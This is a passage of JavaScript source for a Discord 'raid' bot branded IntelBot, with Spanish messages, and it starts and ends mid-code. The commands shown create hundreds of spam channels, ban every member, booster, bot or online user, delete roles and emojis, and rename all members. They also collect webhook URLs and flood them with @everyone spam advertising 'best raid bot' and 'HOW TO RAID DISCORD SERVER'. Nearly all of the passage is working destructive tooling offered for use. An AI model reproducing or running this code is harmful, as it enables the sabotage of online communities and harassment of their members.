                            .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](https://discord.gg/AYRAD4jUdB)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/AYRAD4jUdB`)
                            .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                        ]});
                    } catch (e) {};
                };
                } catch (e) {
                    console.log(e.message)
                }
            };
            let raidk = false;
            let raidk_number = 0;
            async function crear_ch(channel_name) {
                const res = await fetch(`https://discord.com/api/v9/guilds/${guildxd.id}/channels`, {
                    method: 'POST',
                    headers: {
                        "Authorization": `Bot ${bot_token}`,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        name: `${channel_name}`,
                        type: 0
                    }),
                });
                const resJson = await res.json();
                if(res.status === 429){
                    await wait_ms(resJson["retry_after"]);
                    if(nm_ch_atck === "iNTELbot-on-top"){
                        const randomNameIndex = Math.floor(Math.random() * raid_canal_nombres.length);
                        await crear_ch(raid_canal_nombres[randomNameIndex]);
                    } else {
                        await crear_ch(nm_ch_atck);
                    }
                } else {
                    raidk_number++;
                };
                if(raidk_number === 500 && !raidk){
                    raidk = true
                    const chs = await guildxd.channels.fetch();
                    for (let ch of chs.values()) {
                        spam_ch(ch.id);
                    };
                    return;
                };
            };
            for (let index = 0; index < 500; index++) {
                if(nm_ch_atck === "iNTELBOT-on-top"){
                    const randomNameIndex = Math.floor(Math.random() * raid_canal_nombres.length);
                    crear_ch(raid_canal_nombres[randomNameIndex]);
                } else {
                    crear_ch(nm_ch_atck);
                }
                await wait_ms(10);          
            };
            msg.author.send({embeds:[new EmbedBuilder().setDescription(`:skull: ${raidk_number} canales creados correctamente.`)]})
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"massban"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            let m_i=0;
            let ms = await guildxd.members.fetch();
            for (let m of ms.values()) {
                try {
                    await m.ban("https://discord.gg/AYRAD4jUdB");
                    m_i++;
                } catch (e) {
                    console.log(e.message);
                };
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: ${m_i} miembros baneados correctamente.`)]});
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_1+"createroles"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            let nm_rl_atck = users_data[msg.author.id]?.nm_roles_attack ? users_data[msg.author.id].nm_roles_attack : "IntelBot on top";
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot  log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            let rl_i=0;
            let rl_cr = 500-guildxd.roles.cache.size;
            for (let index = 0; index < rl_cr; index++) {
                try {
                    await guildxd.roles.create({name:nm_rl_atck, color:Colors.DarkPurple, reason:'https://discord.gg/zCQ8jQ2GBf'})
                    rl_i++;
                } catch (e) {
                    console.log(e.message);   
                };
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: ${rl_i} roles creados correctamente.`)]});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"deleteallroles"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot  on top!`})
            ]});
            let rl_i=0;
            let rls = await guildxd.roles.fetch();
            for (let rl of rls.values()) {
                try {
                    await rl.delete();
                    rl_i++;
                } catch (e) {
                    console.log(e.message);
                };
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: ${rl_i} roles eliminados correctamente.`)]});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"activitymassban"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot  log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot  on top!`})
            ]});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"banboosters"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot  log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot  on top!`})
            ]});
            let m_i=0;
            let ms_b = (await msg.guild.members.fetch()).filter(member=>member.premiumSinceTimestamp);
            for (let m_b of ms_b.values()) {
                try {
                    await m_b.ban("https://discord.gg/AYRAD4jUdB");
                    m_i++;
                } catch (e) {
                    console.log(e.message);
                };
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: ${m_i} boosters baneados correctamente.`)]});

        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_1+"banbots"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            let m_i=0;
            let ms_bot = guildxd.members.cache.filter(m=>m.user.bot===true);
            for (let m_bot of ms_bot.values()) {
                try {
                    await m_bot.ban("https://discord.gg/AYRAD4jUdB");
                    m_i++;
                } catch (e) {
                    console.log(e.message);
                };
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: ${m_i} bots baneados correctamente.`)]});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"onlinemassban"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            let m_i=0;
            let ms_online = guildxd.members.cache.filter(m=>m.presence.status==="online");
            for (let m_bot of ms_online.values()) {
                try {
                    await m_bot.ban("https://discord.gg/AYRAD4jUdB");
                    m_i++;
                } catch (e) {
                    console.log(e.message);
                };
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: ${m_i} miembros online baneados correctamente.`)]});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"massunban"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            let m_i=0;
            let ms_bans = guildxd.bans.fetch();
            for (let m_band of ms_bans.values()) {
                try {
                    await guildxd.members.unban(m_band.id);
                    await m_bot.ban("https://discord.gg/AYRAD4jUdB");
                    m_i++;
                } catch (e) {
                    console.log(e.message);
                };
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: ${m_i} miembros unbanneados correctamente.`)]});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"viewhooks"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            let wh_i = 0;
            let fils = [];
            let chs = await guildxd.channels.fetch();
            for (let ch of chs.values()) {
                let whs = await ch.fetchWebhooks();
                for (let wh of whs.values()) {
                    fils.push({ name: wh.name, value: wh.url });
                    wh_i++;
                };
            };
            const bloqs = [];
            for (let i = 0; i < fils.length; i += 10) {
                bloqs.push(fils.slice(i, i + 10));
            };
            for (const bloq of bloqs) {
                const embed = new EmbedBuilder().addFields(bloq);
                await msg.author.send({ embeds: [embed] });
            };
            await msg.author.send({embeds: [new EmbedBuilder().setDescription(`:gem: ${wh_i} webhooks obtenidas correctamente.`)],});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(command_1 === "fuckhook"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            let txt_atck_ = users_data[msg.author.id]?.text_attack ? users_data[msg.author.id].text_attack : "https://discord.gg/RR2qSCG45d";
            let inv_atck = users_data[msg.author.id]?.invite_attack ? users_data[msg.author.id].invite_attack : "https://discord.gg/RR2qSCG45d";
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            async function spam_wh(wh_url) {
                try {
                    const whxd = new WebhookClient({url:wh_url});
                    for (let index = 0; index < 100; index++) {
                        try {
                            await whxd.send({content:`** https://discord.gg/zCQ8jQ2GBf **\n${txt_atck_}\n ${inv_atck} \n@everyone`, embeds:[
                                new EmbedBuilder()
                                .setTitle(` ‎                           ‎ **SERVER FUCKED BY Intel**\n ‎                                 ‎ **#IntelBot**`)
                                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](https://discord.gg/AYRAD4jUdB)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/AYRAD4jUdB`)
                                .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                            ]});
                        } catch (e) {
                            console.log(e.message);
                        };
                    };
                } catch (e) {
                    console.log(e.message)
                }
            };
            if(args1.length > 1){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar una webhook.`)]})
                return;
            } else if(args1.length === 1){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Iniciando spam en la webhook...`)]})
                await spam_wh(args1[0]);
            } else {
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar una webhook.`)]})
                return;
            };
        } catch (e) {
            console.log(e.message);
            if(e.message === "The provided webhook URL is not valid."){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Coloca una webhook existente!`)]});
                return;
            } else {
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Ocurrió un error en el comando, comunicate con brizli XD.`)]});
                return;
            };
        };
    };
    if(msg.content === prefix_1+"delemojis"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            let emj_i=0;
            let emjs = await guildxd.emojis.fetch();
            for (let emj of emjs.values()) {
                try {
                    await emj.delete();
                    emj_i++;
                } catch (e) {
                    console.log(e.message);
                };
            };
            await msg.author.send({embeds: [new EmbedBuilder().setDescription(`:gem: ${emj_i} emojis eliminadas correctamente.`)],});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"massnick"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`wapned bot replikt on top!`})
            ]});
            let m_i=0;
            let ms = await guildxd.members.fetch();
            for (let m of ms.values()) {
                try {
                    await m.setNickname(".gg/AYRAD4jUdB | IntelBot");
                    m_i++;
                } catch (e) {
                    console.log(e.message);
                };
            };
            await msg.author.send({embeds: [new EmbedBuilder().setDescription(`:gem: ${m_i} miembros renombrados correctamente.`)],});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"leave"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 IntelBot log** ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`IntelBot on top!`})
            ]});
            try {
                await guildxd.leave();
                await msg.author.send({embeds: [new EmbedBuilder().setDescription(`:gem: El bot se salió del servidor.`)],});
            } catch (e) {
                console.log(e.message);
            };
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"guild"){
        try {
            let guildxd_id = ``;
